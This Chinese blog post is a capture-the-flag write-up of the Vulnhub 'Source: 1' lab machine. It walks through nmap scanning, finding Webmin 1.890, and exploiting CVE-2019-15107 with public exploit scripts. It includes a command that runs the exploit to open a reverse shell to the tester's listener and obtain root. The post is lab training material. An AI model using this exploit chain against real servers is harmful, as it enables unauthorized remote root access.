
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18766157" title="发布于 2025-03-11 21:36">
    <span role="heading" aria-level="2">Vulnhub-Source-1（CVE-2019-15107）</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="一靶机搭建">一、靶机搭建</h1>
<p>选择打开选项</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311130231233.png" alt="" loading="lazy"></p>
<p>选中下载的ova文件，然后导入选择一个存放路径即可</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311130312677.png" alt="" loading="lazy"></p>
<p>如果遇到不兼容的情况，可以打开<strong>.vmx</strong>修改，改为和虚拟机一个版本号</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311130434073.png" alt="" loading="lazy"></p>
<h1 id="二信息收集">二、信息收集</h1>
<h2 id="官方信息">官方信息</h2>
<pre><code>Name: Source: 1
Date release: 17 Jul 2020
难度：初级
描述：为 AttackerKB 聊天室创建的简单 CTF 盒子。这是练习的独立版本。这个框可能会出现在供应链攻击的后续房间里，因为它是一个很好的最新例子。
</code></pre>
<h2 id="扫ip">扫ip</h2>
<p>靶机ip：<strong>192.168.108.154</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311132038411.png" alt="" loading="lazy"></p>
<h2 id="扫开放服务和端口">扫开放服务和端口</h2>
<p>开放了<strong>22和10000</strong>端口</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311132216202.png" alt="" loading="lazy"></p>
<h2 id="指纹探测">指纹探测</h2>
<pre><code class="language-bash">nmap 192.168.108.154 -p 22,10000 -sV -sC -O --version-all 
</code></pre>
<p>没什么可以利用的信息，看到<strong>10000</strong>端口版本信息，<strong>MiniServ 1.890</strong> （Webmin httpd）</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311132432570.png" alt="" loading="lazy"></p>
<h2 id="目录扫描">目录扫描</h2>
<p><strong>dirsearch</strong>扫描看看，扫不出来</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311132920149.png" alt="" loading="lazy"></p>
<p><strong>dirb</strong>扫描，无结果</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311132658263.png" alt="" loading="lazy"></p>
<h1 id="三web渗渗透">三、Web渗渗透</h1>
<p>访问<strong>10000</strong>端口，是一个登录网站，源码和指纹信息都没有什么利用点</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311133049796.png" alt="" loading="lazy"></p>
<p>想到刚才找到的网站版本号，查找一下历史漏洞</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140538926.png" alt="" loading="lazy"></p>
<p>下载下来查看一下，需要结合<strong>msf</strong>才能使用</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140605698.png" alt="" loading="lazy"></p>
<h2 id="cve-2019-15107-webmin远程命令执行漏洞">CVE-2019-15107-Webmin远程命令执行漏洞</h2>
<p>上网搜一下看看，存在漏洞，参考文章：</p>
<pre><code class="language-php">https://github.com/squid22/Webmin_CVE-2019-15107
https://github.com/jas502n/CVE-2019-15107?tab=readme-ov-file
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140655756.png" alt="" loading="lazy"></p>
<p>下载exp到kali</p>
<h1 id="四提权">四、提权</h1>
<p>赋予权限</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140807009.png" alt="" loading="lazy"></p>
<p>开启监听端口，并执行脚本</p>
<pre><code class="language-bash">./webmin_exploit.py 192.168.108.154 10000 192.168.108.130 4444
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140852999.png" alt="" loading="lazy"></p>
<p>拿到root权限</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140329064.png" alt="" loading="lazy"></p>
<p>在跟目录下发现<strong>flag</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250311140947135.png" alt="" loading="lazy"></p>
<p>flag：<strong>THM{UPDATE_YOUR_INSTALL}</strong></p>

</div>
<div class="clear"></div>

            </div>
